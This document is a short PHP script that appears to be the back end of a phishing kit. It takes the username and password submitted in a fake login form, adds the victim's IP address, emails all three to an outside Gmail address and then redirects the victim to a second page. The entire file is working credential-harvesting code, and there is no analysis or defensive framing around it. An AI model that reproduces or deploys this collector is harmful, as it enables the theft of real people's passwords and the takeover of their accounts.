<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ourtime || :------\n";
$message .= "User: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="officemanagementunit@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: index2.html");
?>